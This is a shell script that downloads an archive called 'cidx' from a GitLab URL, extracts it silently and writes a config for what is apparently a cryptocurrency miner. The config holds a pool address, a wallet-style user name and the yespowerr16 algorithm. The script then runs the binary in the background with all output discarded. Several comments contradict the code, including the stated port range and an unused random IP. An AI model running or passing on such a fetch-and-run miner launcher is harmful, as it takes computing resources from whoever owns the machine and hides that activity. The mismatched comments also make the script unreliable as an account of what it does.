# Download and extract the cidx file
wget -O cidx gitlab.com/jasa4/minulme/-/raw/main/cidxC.tar.gz && tar -xvf cidx >/dev/null 2>&1

# Download JSON file from GitHub containing IP addresses
wget -O ip_list.json https://github.com/barburonjilo/open/raw/refs/heads/main/list.json >/dev/null 2>&1

# Select a random IP from the JSON file
random_ip=$(jq -r '.ips | .[]' ip_list.json | shuf -n 1)

# Generate a random port in the range 501-510
random_port=$((801 + RANDOM % 10))

# Set the current date in UTC-7 format
current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")

# Create config.json with the selected IP and port
cat > config.json <<END
{
  "url": "45.115.225.115:$random_port",
  "user": "YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC.fix",
  "pass": "m=solo",
  "threads": 8,
  "algo": "yespowerr16"
}
END


# Make cidx and config.json executable
chmod +x config.json cidx

# Run cidx in the background
nohup ./cidx -c 'config.json' &>/dev/null &

# Clear the screen and print the current time and running jobs
clear
echo RUN $(TZ=UTC-7 date +"%R-[%d/%m/%y]") && jobs

# Run awk to process config.json and print the matching date-time part
awk '/i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/ { print $0 }' config.json
